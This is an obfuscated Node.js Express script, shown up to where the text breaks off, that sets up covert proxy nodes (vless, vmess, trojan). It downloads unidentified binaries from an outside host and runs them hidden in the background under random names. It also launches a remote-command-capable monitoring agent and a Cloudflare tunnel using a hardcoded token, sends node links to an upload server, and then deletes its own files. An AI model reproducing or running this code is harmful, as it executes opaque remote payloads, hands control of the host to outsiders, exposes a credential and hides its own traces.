const _0x8a7352=_0x586b;(function(_0x3932f3,_0x1bc6fe){const _0x15a60e=_0x586b,_0x325053=_0x3932f3();while(!![]){try{const _0x548635=-parseInt(_0x15a60e(0x2af))/0x1+parseInt(_0x15a60e(0x223))/0x2+-parseInt(_0x15a60e(0x1fd))/0x3+parseInt(_0x15a60e(0x1ed))/0x4+-parseInt(_0x15a60e(0x218))/0x5+parseInt(_0x15a60e(0x241))/0x6*(-parseInt(_0x15a60e(0x213))/0x7)+-parseInt(_0x15a60e(0x254))/0x8*(-parseInt(_0x15a60e(0x268))/0x9);if(_0x548635===_0x1bc6fe)break;else _0x325053['push'](_0x325053['shift']());}catch(_0x36e8f1){_0x325053['push'](_0x325053['shift']());}}}(_0x3747,0xc27af));const express=require(_0x8a7352(0x210)),app=express(),axios=require(_0x8a7352(0x27e)),os=require('os'),fs=require('fs'),path=require(_0x8a7352(0x21d)),{promisify}=require(_0x8a7352(0x298)),exec=promisify(require(_0x8a7352(0x26f))['exec']),UPLOAD_URL=process['env'][_0x8a7352(0x1fa)]||'',PROJECT_URL=process[_0x8a7352(0x1f6)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x8a7352(0x1f6)][_0x8a7352(0x2a1)]||![],FILE_PATH=process[_0x8a7352(0x1f6)]['FILE_PATH']||_0x8a7352(0x1fb),SUB_PATH=process['env']['SUB_PATH']||_0x8a7352(0x267),PORT=process[_0x8a7352(0x1f6)][_0x8a7352(0x2ab)]||process[_0x8a7352(0x1f6)]['PORT']||0xbb8,UUID=process['env'][_0x8a7352(0x206)]||_0x8a7352(0x23d),NEZHA_SERVER=process[_0x8a7352(0x1f6)][_0x8a7352(0x211)]||'',NEZHA_PORT=process[_0x8a7352(0x1f6)][_0x8a7352(0x261)]||'',NEZHA_KEY=process[_0x8a7352(0x1f6)][_0x8a7352(0x1f3)]||'',ARGO_DOMAIN=process[_0x8a7352(0x1f6)][_0x8a7352(0x27c)]||_0x8a7352(0x227),ARGO_AUTH=process['env'][_0x8a7352(0x2ae)]||_0x8a7352(0x286),ARGO_PORT=process[_0x8a7352(0x1f6)][_0x8a7352(0x237)]||0x1f41,CFIP=process[_0x8a7352(0x1f6)][_0x8a7352(0x25b)]||_0x8a7352(0x260),CFPORT=process['env']['CFPORT']||0x1bb,NAME=process['env']['NAME']||_0x8a7352(0x2aa);!fs[_0x8a7352(0x258)](FILE_PATH)?(fs[_0x8a7352(0x1f0)](FILE_PATH),console[_0x8a7352(0x285)](FILE_PATH+_0x8a7352(0x23f))):console[_0x8a7352(0x285)](FILE_PATH+_0x8a7352(0x249));function generateRandomName(){const _0x7619de=_0x8a7352,_0x5d9886=_0x7619de(0x272);let _0x217f2b='';for(let _0x465da1=0x0;_0x465da1<0x6;_0x465da1++){_0x217f2b+=_0x5d9886['charAt'](Math['floor'](Math[_0x7619de(0x251)]()*_0x5d9886['length']));}return _0x217f2b;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x8a7352(0x22d)](FILE_PATH,npmName),phpPath=path[_0x8a7352(0x22d)](FILE_PATH,phpName),webPath=path[_0x8a7352(0x22d)](FILE_PATH,webName),botPath=path[_0x8a7352(0x22d)](FILE_PATH,botName),subPath=path[_0x8a7352(0x22d)](FILE_PATH,_0x8a7352(0x22f)),listPath=path[_0x8a7352(0x22d)](FILE_PATH,_0x8a7352(0x1ec)),bootLogPath=path[_0x8a7352(0x22d)](FILE_PATH,_0x8a7352(0x20f)),configPath=path[_0x8a7352(0x22d)](FILE_PATH,_0x8a7352(0x28b));function deleteNodes(){const _0x494a10=_0x8a7352;try{if(!UPLOAD_URL)return;if(!fs[_0x494a10(0x258)](subPath))return;let _0x161a7d;try{_0x161a7d=fs[_0x494a10(0x271)](subPath,_0x494a10(0x200));}catch{return null;}const _0x628c84=Buffer['from'](_0x161a7d,'base64')['toString'](_0x494a10(0x200)),_0x50642c=_0x628c84[_0x494a10(0x20c)]('\x0a')[_0x494a10(0x216)](_0x3cd560=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x494a10(0x22c)](_0x3cd560));if(_0x50642c[_0x494a10(0x234)]===0x0)return;return axios[_0x494a10(0x284)](UPLOAD_URL+_0x494a10(0x2a7),JSON[_0x494a10(0x291)]({'nodes':_0x50642c}),{'headers':{'Content-Type':_0x494a10(0x212)}})['catch'](_0xee4c65=>{return null;}),null;}catch(_0x2ce9d6){return null;}}function cleanupOldFiles(){const _0x4aa37a=_0x8a7352;try{const _0x4b3498=fs[_0x4aa37a(0x1ff)](FILE_PATH);_0x4b3498[_0x4aa37a(0x244)](_0x245421=>{const _0x1a113f=_0x4aa37a,_0x4c1492=path['join'](FILE_PATH,_0x245421);try{const _0x340999=fs[_0x1a113f(0x24a)](_0x4c1492);_0x340999[_0x1a113f(0x22a)]()&&fs[_0x1a113f(0x29d)](_0x4c1492);}catch(_0x46754f){}});}catch(_0x2207f4){}}async function generateConfig(){const _0x3da5dc=_0x8a7352,_0x44022b={'log':{'access':'/dev/null','error':_0x3da5dc(0x21c),'loglevel':_0x3da5dc(0x290)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x3da5dc(0x246),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x3da5dc(0x290),'fallbacks':[{'dest':0xbb9},{'path':_0x3da5dc(0x26e),'dest':0xbba},{'path':_0x3da5dc(0x201),'dest':0xbbb},{'path':_0x3da5dc(0x250),'dest':0xbbc}]},'streamSettings':{'network':_0x3da5dc(0x21f)}},{'port':0xbb9,'listen':_0x3da5dc(0x235),'protocol':_0x3da5dc(0x246),'settings':{'clients':[{'id':UUID}],'decryption':_0x3da5dc(0x290)},'streamSettings':{'network':_0x3da5dc(0x21f),'security':_0x3da5dc(0x290)}},{'port':0xbba,'listen':_0x3da5dc(0x235),'protocol':_0x3da5dc(0x246),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x3da5dc(0x290)},'streamSettings':{'network':'ws','security':_0x3da5dc(0x290),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x3da5dc(0x29e),'tls',_0x3da5dc(0x23c)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x3da5dc(0x235),'protocol':_0x3da5dc(0x2a8),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x3da5dc(0x201)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x3da5dc(0x269),_0x3da5dc(0x23c)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x3da5dc(0x282),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x3da5dc(0x250)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x3da5dc(0x269),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x3da5dc(0x27b)]},'outbounds':[{'protocol':_0x3da5dc(0x26c),'tag':_0x3da5dc(0x214)},{'protocol':_0x3da5dc(0x2b1),'tag':_0x3da5dc(0x225)}]};fs[_0x3da5dc(0x1f2)](path[_0x3da5dc(0x22d)](FILE_PATH,_0x3da5dc(0x28b)),JSON[_0x3da5dc(0x291)](_0x44022b,null,0x2));}function _0x3747(){const _0x17ff62=['substring','util','Error\x20in\x20startserver:','platform','includes','utf8','unlinkSync','http','data','?encryption=none&security=tls&sni=','AUTO_ACCESS','Unknown','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x20-c\x20\x22','\x0a\x20\x20credentials-file:\x20','stream','/api/delete-nodes','vmess','unshift','Galaxy','SERVER_PORT','Error\x20downloading\x20files:','from','ARGO_AUTH','757902qlZzaA','&fp=firefox&type=ws&host=','blackhole','list.txt','5966448DCdlXn','2083','push','mkdirSync','/config.json\x20>/dev/null\x202>&1\x20&','writeFileSync','NEZHA_KEY','catch','ARGO_DOMAIN:','env','finish','/api/add-subscriptions','true','UPLOAD_URL','.tmp','tunnel.json','4205187wnYJnK','countryCode','readdirSync','utf-8','/vmess-argo','charAt','443','TunnelSecret','index.html','UUID','https://ipapi.co/json','aarch64','2053','base64','Empowerment\x20failed\x20for\x20','split','https://amd64.ssss.nyc.mn/v1','https://arm64.ssss.nyc.mn/v1','boot.log','express','NEZHA_SERVER','application/json','7gJXBCh','direct','\x20is\x20running','filter','\x20-p\x20','1096135bwzwaR','pkill\x20-f\x20\x22[','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','https://arm64.ssss.nyc.mn/bot','/dev/null','path','http://ip-api.com/json','tcp','get','/vmess-argo?ed=2560','Subscription\x20uploaded\x20successfully','408156QrMwUz','.exe\x20>\x20nul\x202>&1','block','web\x20running\x20error:\x20','sapsgp.bzfmq.dpdns.org','toString','8443','isFile','\x0aclient_secret:\x20','test','join','response','sub.txt','&path=%2Fvless-argo%3Fed%3D2560#','Download\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','chmod','length','127.0.0.1','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','ARGO_PORT','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x20>/dev/null\x202>&1\x20&','close','App\x20is\x20running','quic','494c3917-8632-4a63-8f46-f02d3da9ed84','php\x20running\x20error:\x20','\x20is\x20created','\x0a\x20\x20tunnel:\x20','2403900TOqUfd','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','https://amd64.ssss.nyc.mn/bot','forEach','clear','vless','arm','Empowerment\x20success\x20for\x20','\x20already\x20exists','statSync','ArgoDomain:','pop','https://arm64.ssss.nyc.mn/agent','false','error','/trojan-argo','random','/tunnel.yml\x20run','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','15043272LVkRzf','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','Skipping\x20adding\x20automatic\x20access\x20task','existsSync','--tls','Unhandled\x20error\x20in\x20startserver:','CFIP','fileUrl','npm\x20running\x20error:\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','pipe','cdns.doon.eu.org','NEZHA_PORT','2087','https://amd64.ssss.nyc.mn/web','taskkill\x20/f\x20/im\x20','all','message','sub','9njCZvM','tls','then','listen','freedom','basename','/vless-argo','child_process','nohup\x20','readFileSync','abcdefghijklmnopqrstuvwxyz','del\x20/f\x20/q\x20','match','unlink','\x0a\x0avmess://','send','set','arch','Service\x20is\x20runing!<br><br>You\x20can\x20visit\x20/{SUB_PATH}(Default:\x20/sub)\x20get\x20your\x20nodes!','https+local://8.8.8.8/dns-query','ARGO_DOMAIN','\x20-s\x20','axios','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Error\x20reading\x20boot.log:','https://arm64.ssss.nyc.mn/web','trojan','readFile','post','log','eyJhIjoiZTM1N2NlMDRmYWVkODU2OWViOTFjZmRmMjZiZDBkZWQiLCJ0IjoiOGRmYzRmYTEtMGEzNC00YzczLWEwMDAtYTNjODExMGZmNmNjIiwicyI6IlltTXhOR1kzWWpndE4ySmpOUzAwTnpJMUxUZzJPVE10WVdSaFlUbGlaRGc0Wm1OaiJ9','org','fileName','\x22\x20>\x20/dev/null\x202>&1','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','config.json','country_code','Add\x20automatic\x20access\x20task\x20faild:\x20','amd','status','none','stringify','2096','Error\x20executing\x20command:\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','config.yaml','arm64'];_0x3747=function(){return _0x17ff62;};return _0x3747();}function getSystemArchitecture(){const _0x15b9b3=_0x8a7352,_0x4f8277=os[_0x15b9b3(0x279)]();return _0x4f8277==='arm'||_0x4f8277===_0x15b9b3(0x296)||_0x4f8277===_0x15b9b3(0x208)?'arm':_0x15b9b3(0x28e);}function downloadFile(_0x4d0b95,_0x5ac906,_0x285d07){const _0x42f622=_0x8a7352,_0x2d2fdb=_0x4d0b95;!fs[_0x42f622(0x258)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x2234b9=fs['createWriteStream'](_0x2d2fdb);axios({'method':_0x42f622(0x220),'url':_0x5ac906,'responseType':_0x42f622(0x2a6)})[_0x42f622(0x26a)](_0x1af109=>{const _0x517163=_0x42f622;_0x1af109[_0x517163(0x29f)][_0x517163(0x25f)](_0x2234b9),_0x2234b9['on'](_0x517163(0x1f7),()=>{const _0x59439b=_0x517163;_0x2234b9[_0x59439b(0x23a)](),console[_0x59439b(0x285)]('Download\x20'+path[_0x59439b(0x26d)](_0x2d2fdb)+'\x20successfully'),_0x285d07(null,_0x2d2fdb);}),_0x2234b9['on'](_0x517163(0x24f),_0x258ea1=>{const _0x1967d6=_0x517163;fs[_0x1967d6(0x275)](_0x2d2fdb,()=>{});const _0x485b46=_0x1967d6(0x231)+path['basename'](_0x2d2fdb)+'\x20failed:\x20'+_0x258ea1['message'];console[_0x1967d6(0x24f)](_0x485b46),_0x285d07(_0x485b46);});})[_0x42f622(0x1f4)](_0x951433=>{const _0x334b9f=_0x42f622,_0x50e513=_0x334b9f(0x231)+path[_0x334b9f(0x26d)](_0x2d2fdb)+'\x20failed:\x20'+_0x951433['message'];console[_0x334b9f(0x24f)](_0x50e513),_0x285d07(_0x50e513);});}async function downloadFilesAndRun(){const _0x3a4622=_0x8a7352,_0x43f7f0=getSystemArchitecture(),_0x241db9=getFilesForArchitecture(_0x43f7f0);if(_0x241db9['length']===0x0){console[_0x3a4622(0x285)](_0x3a4622(0x242));return;}const _0x4e1478=_0x241db9['map'](_0x1d683d=>{return new Promise((_0x49b8e2,_0x369615)=>{const _0x3fe3f7=_0x586b;downloadFile(_0x1d683d[_0x3fe3f7(0x288)],_0x1d683d[_0x3fe3f7(0x25c)],(_0x4ee64a,_0x474481)=>{_0x4ee64a?_0x369615(_0x4ee64a):_0x49b8e2(_0x474481);});});});try{await Promise[_0x3a4622(0x265)](_0x4e1478);}catch(_0x6a74eb){console['error'](_0x3a4622(0x2ac),_0x6a74eb);return;}function _0x1146c1(_0x4adee7){const _0x2852c4=_0x3a4622,_0x219539=0x1fd;_0x4adee7[_0x2852c4(0x244)](_0x5ab6ae=>{const _0x25a4af=_0x2852c4;fs['existsSync'](_0x5ab6ae)&&fs[_0x25a4af(0x233)](_0x5ab6ae,_0x219539,_0x17b717=>{const _0xa41728=_0x25a4af;_0x17b717?console[_0xa41728(0x24f)](_0xa41728(0x20b)+_0x5ab6ae+':\x20'+_0x17b717):console[_0xa41728(0x285)](_0xa41728(0x248)+_0x5ab6ae+':\x20'+_0x219539['toString'](0x8));});});}const _0x5aa19c=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1146c1(_0x5aa19c);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x11cdd7=NEZHA_SERVER[_0x3a4622(0x29b)](':')?NEZHA_SERVER['split'](':')[_0x3a4622(0x24c)]():'',_0x35eb30=new Set(['443','8443',_0x3a4622(0x292),_0x3a4622(0x262),_0x3a4622(0x1ee),_0x3a4622(0x209)]),_0x4589b8=_0x35eb30['has'](_0x11cdd7)?_0x3a4622(0x1f9):_0x3a4622(0x24e),_0x3db39e=_0x3a4622(0x22b)+NEZHA_KEY+_0x3a4622(0x28a)+NEZHA_SERVER+_0x3a4622(0x2a3)+_0x4589b8+_0x3a4622(0x27f)+UUID;fs[_0x3a4622(0x1f2)](path['join'](FILE_PATH,_0x3a4622(0x295)),_0x3db39e);const _0x102ff8=_0x3a4622(0x270)+phpPath+_0x3a4622(0x2a4)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x102ff8),console[_0x3a4622(0x285)](phpName+_0x3a4622(0x215)),await new Promise(_0x1eca61=>setTimeout(_0x1eca61,0x3e8));}catch(_0x442078){console[_0x3a4622(0x24f)](_0x3a4622(0x23e)+_0x442078);}}else{let _0x1bbc7e='';const _0xc22a2d=[_0x3a4622(0x203),_0x3a4622(0x229),_0x3a4622(0x292),_0x3a4622(0x262),_0x3a4622(0x1ee),'2053'];_0xc22a2d['includes'](NEZHA_PORT)&&(_0x1bbc7e=_0x3a4622(0x259));const _0x442ff6=_0x3a4622(0x270)+npmPath+_0x3a4622(0x27d)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3a4622(0x217)+NEZHA_KEY+'\x20'+_0x1bbc7e+_0x3a4622(0x238);try{await exec(_0x442ff6),console[_0x3a4622(0x285)](npmName+_0x3a4622(0x215)),await new Promise(_0x428664=>setTimeout(_0x428664,0x3e8));}catch(_0x5c0cf9){console[_0x3a4622(0x24f)](_0x3a4622(0x25d)+_0x5c0cf9);}}}else console[_0x3a4622(0x285)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x4535bd=_0x3a4622(0x270)+webPath+'\x20-c\x20'+FILE_PATH+_0x3a4622(0x1f1);try{await exec(_0x4535bd),console[_0x3a4622(0x285)](webName+'\x20is\x20running'),await new Promise(_0x107d70=>setTimeout(_0x107d70,0x3e8));}catch(_0x2f3d9f){console[_0x3a4622(0x24f)](_0x3a4622(0x226)+_0x2f3d9f);}if(fs[_0x3a4622(0x258)](botPath)){let _0x117c06;if(ARGO_AUTH[_0x3a4622(0x274)](/^[A-Z0-9a-z=]{120,250}$/))_0x117c06=_0x3a4622(0x21a)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x117c06='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x3a4622(0x252):_0x117c06=_0x3a4622(0x232)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x3a4622(0x270)+botPath+'\x20'+_0x117c06+'\x20>/dev/null\x202>&1\x20&'),console[_0x3a4622(0x285)](botName+_0x3a4622(0x215)),await new Promise(_0x145b1f=>setTimeout(_0x145b1f,0x7d0));}catch(_0x43726e){console[_0x3a4622(0x24f)]('Error\x20executing\x20command:\x20'+_0x43726e);}}await new Promise(_0x23a843=>setTimeout(_0x23a843,0x1388));}function getFilesForArchitecture(_0x15738c){const _0x258c67=_0x8a7352;let _0x376cff;_0x15738c===_0x258c67(0x247)?_0x376cff=[{'fileName':webPath,'fileUrl':_0x258c67(0x281)},{'fileName':botPath,'fileUrl':_0x258c67(0x21b)}]:_0x376cff=[{'fileName':webPath,'fileUrl':_0x258c67(0x263)},{'fileName':botPath,'fileUrl':_0x258c67(0x243)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x56d651=_0x15738c===_0x258c67(0x247)?_0x258c67(0x24d):'https://amd64.ssss.nyc.mn/agent';_0x376cff[_0x258c67(0x2a9)]({'fileName':npmPath,'fileUrl':_0x56d651});}else{const _0x338c95=_0x15738c===_0x258c67(0x247)?_0x258c67(0x20e):_0x258c67(0x20d);_0x376cff['unshift']({'fileName':phpPath,'fileUrl':_0x338c95});}}return _0x376cff;}function argoType(){const _0x5b8f77=_0x8a7352;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x5b8f77(0x285)](_0x5b8f77(0x253));return;}if(ARGO_AUTH[_0x5b8f77(0x29b)](_0x5b8f77(0x204))){fs['writeFileSync'](path[_0x5b8f77(0x22d)](FILE_PATH,_0x5b8f77(0x1fc)),ARGO_AUTH);const _0x330897=_0x5b8f77(0x240)+ARGO_AUTH['split']('\x22')[0xb]+_0x5b8f77(0x2a5)+path['join'](FILE_PATH,_0x5b8f77(0x1fc))+_0x5b8f77(0x25e)+ARGO_DOMAIN+_0x5b8f77(0x236)+ARGO_PORT+_0x5b8f77(0x256);fs[_0x5b8f77(0x1f2)](path[_0x5b8f77(0x22d)](FILE_PATH,'tunnel.yml'),_0x330897);}else console['log'](_0x5b8f77(0x294));}async function extractDomains(){const _0x165c23=_0x8a7352;let _0x942942;if(ARGO_AUTH&&ARGO_DOMAIN)_0x942942=ARGO_DOMAIN,console['log'](_0x165c23(0x1f5),_0x942942),await _0x54ba24(_0x942942);else try{const _0xc3f1b5=fs['readFileSync'](path['join'](FILE_PATH,'boot.log'),_0x165c23(0x200)),_0x3b3175=_0xc3f1b5[_0x165c23(0x20c)]('\x0a'),_0x4e7ba1=[];_0x3b3175[_0x165c23(0x244)](_0x315330=>{const _0xbc8926=_0x165c23,_0x514ab0=_0x315330[_0xbc8926(0x274)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x514ab0){const _0x58bb28=_0x514ab0[0x1];_0x4e7ba1[_0xbc8926(0x1ef)](_0x58bb28);}});if(_0x4e7ba1['length']>0x0)_0x942942=_0x4e7ba1[0x0],console[_0x165c23(0x285)](_0x165c23(0x24b),_0x942942),await _0x54ba24(_0x942942);else{console[_0x165c23(0x285)](_0x165c23(0x255)),fs[_0x165c23(0x29d)](path['join'](FILE_PATH,_0x165c23(0x20f)));async function _0x10d4ce(){const _0x59916c=_0x165c23;try{process[_0x59916c(0x29a)]==='win32'?await exec(_0x59916c(0x264)+botName+_0x59916c(0x224)):await exec(_0x59916c(0x219)+botName[_0x59916c(0x202)](0x0)+']'+botName[_0x59916c(0x297)](0x1)+_0x59916c(0x289));}catch(_0x4ccc0e){}}_0x10d4ce(),await new Promise(_0xa846b1=>setTimeout(_0xa846b1,0xbb8));const _0x544c10='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x165c23(0x270)+botPath+'\x20'+_0x544c10+_0x165c23(0x239)),console[_0x165c23(0x285)](botName+_0x165c23(0x215)),await new Promise(_0x6f4b5f=>setTimeout(_0x6f4b5f,0xbb8)),await extractDomains();}catch(_0x492d13){console['error'](_0x165c23(0x293)+_0x492d13);}}}catch(_0x2aec9b){console[_0x165c23(0x24f)](_0x165c23(0x280),_0x2aec9b);}async function _0x194723(){const _0x56b866=_0x165c23;try{const _0x104caa=await axios['get'](_0x56b866(0x207),{'timeout':0xbb8});if(_0x104caa[_0x56b866(0x29f)]&&_0x104caa[_0x56b866(0x29f)][_0x56b866(0x28c)]&&_0x104caa['data'][_0x56b866(0x287)])return _0x104caa[_0x56b866(0x29f)][_0x56b866(0x28c)]+'_'+_0x104caa[_0x56b866(0x29f)][_0x56b866(0x287)];}catch(_0x30cd16){try{const _0x5b2744=await axios['get'](_0x56b866(0x21e),{'timeout':0xbb8});if(_0x5b2744[_0x56b866(0x29f)]&&_0x5b2744[_0x56b866(0x29f)]['status']==='success'&&_0x5b2744[_0x56b866(0x29f)][_0x56b866(0x1fe)]&&_0x5b2744['data'][_0x56b866(0x287)])return _0x5b2744[_0x56b866(0x29f)][_0x56b866(0x1fe)]+'_'+_0x5b2744['data'][_0x56b866(0x287)];}catch(_0x2fb1c6){}}return _0x56b866(0x2a2);}async function _0x54ba24(_0x2347a9){const _0x529b6c=await _0x194723(),_0x5d05c6=NAME?NAME+'-'+_0x529b6c:_0x529b6c;return new Promise(_0x294588=>{setTimeout(()=>{const _0x9136c8=_0x586b,_0x183224={'v':'2','ps':''+_0x5d05c6,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x9136c8(0x290),'net':'ws','type':_0x9136c8(0x290),'host':_0x2347a9,'path':_0x9136c8(0x221),'tls':_0x9136c8(0x269),'sni':_0x2347a9,'alpn':'','fp':'firefox'},_0x36b936='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x9136c8(0x2a0)+_0x2347a9+'&fp=firefox&type=ws&host='+_0x2347a9+_0x9136c8(0x230)+_0x5d05c6+_0x9136c8(0x276)+Buffer[_0x9136c8(0x2ad)](JSON[_0x9136c8(0x291)](_0x183224))[_0x9136c8(0x228)](_0x9136c8(0x20a))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x2347a9+_0x9136c8(0x2b0)+_0x2347a9+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x5d05c6+'\x0a\x20\x20\x20\x20';console[_0x9136c8(0x285)](Buffer[_0x9136c8(0x2ad)](_0x36b936)[_0x9136c8(0x228)]('base64')),fs[_0x9136c8(0x1f2)](subPath,Buffer[_0x9136c8(0x2ad)](_0x36b936)['toString']('base64')),console[_0x9136c8(0x285)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x9136c8(0x220)]('/'+SUB_PATH,(_0x4f2c01,_0x140546)=>{const _0x402fab=_0x9136c8,_0xc6492e=Buffer[_0x402fab(0x2ad)](_0x36b936)[_0x402fab(0x228)](_0x402fab(0x20a));_0x140546[_0x402fab(0x278)]('Content-Type','text/plain;\x20charset=utf-8'),_0x140546[_0x402fab(0x277)](_0xc6492e);}),_0x294588(_0x36b936);},0x7d0);});}}async function uploadNodes(){const _0x451722=_0x8a7352;if(UPLOAD_URL&&PROJECT_URL){const _0x2554cb=PROJECT_URL+'/'+SUB_PATH,_0xe66146={'subscription':[_0x2554cb]};try{const _0x31baeb=await axios[_0x451722(0x284)](UPLOAD_URL+_0x451722(0x1f8),_0xe66146,{'headers':{'Content-Type':'application/json'}});return _0x31baeb&&_0x31baeb[_0x451722(0x28f)]===0xc8?(console[_0x451722(0x285)](_0x451722(0x222)),_0x31baeb):null;}catch(_0x4112a0){if(_0x4112a0['response']){if(_0x4112a0[_0x451722(0x22e)][_0x451722(0x28f)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x451722(0x258)](listPath))return;const _0x72e099=fs[_0x451722(0x271)](listPath,_0x451722(0x200)),_0x2d70ba=_0x72e099[_0x451722(0x20c)]('\x0a')[_0x451722(0x216)](_0x3b86c4=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x451722(0x22c)](_0x3b86c4));if(_0x2d70ba[_0x451722(0x234)]===0x0)return;const _0x1d748d=JSON[_0x451722(0x291)]({'nodes':_0x2d70ba});try{const _0x485d56=await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x1d748d,{'headers':{'Content-Type':_0x451722(0x212)}});return _0x485d56&&_0x485d56['status']===0xc8?(console[_0x451722(0x285)]('Nodes\x20uploaded\x20successfully'),_0x485d56):null;}catch(_0x5bc482){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x2eca96=_0x586b,_0x482566=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x482566[_0x2eca96(0x1ef)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x482566[_0x2eca96(0x1ef)](phpPath);process[_0x2eca96(0x29a)]==='win32'?exec(_0x2eca96(0x273)+_0x482566[_0x2eca96(0x22d)]('\x20')+'\x20>\x20nul\x202>&1',_0x10351b=>{const _0x4f6057=_0x2eca96;console[_0x4f6057(0x245)](),console['log'](_0x4f6057(0x23b)),console[_0x4f6057(0x285)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0x482566[_0x2eca96(0x22d)]('\x20')+'\x20>/dev/null\x202>&1',_0x10f437=>{const _0x54a9cb=_0x2eca96;console[_0x54a9cb(0x245)](),console[_0x54a9cb(0x285)]('App\x20is\x20running'),console[_0x54a9cb(0x285)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x314448=_0x8a7352;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x314448(0x285)](_0x314448(0x257));return;}try{const _0x4223e2=await axios[_0x314448(0x284)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x314448(0x212)}});return console['log']('automatic\x20access\x20task\x20added\x20successfully'),_0x4223e2;}catch(_0x2728cb){return console[_0x314448(0x24f)](_0x314448(0x28d)+_0x2728cb[_0x314448(0x266)]),null;}}async function startserver(){const _0x3c0768=_0x8a7352;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x114477){console[_0x3c0768(0x24f)](_0x3c0768(0x299),_0x114477);}}function _0x586b(_0x10a168,_0x1654d2){_0x10a168=_0x10a168-0x1ec;const _0x3747de=_0x3747();let _0x586b22=_0x3747de[_0x10a168];return _0x586b22;}startserver()[_0x8a7352(0x1f4)](_0x23075f=>{const _0x20e3b9=_0x8a7352;console[_0x20e3b9(0x24f)](_0x20e3b9(0x25a),_0x23075f);}),app[_0x8a7352(0x220)]('/',async function(_0x887e17,_0x57dae8){const _0x1cfa35=_0x8a7352;try{const _0x5b3bd7=path[_0x1cfa35(0x22d)](__dirname,_0x1cfa35(0x205)),_0x226ca9=await 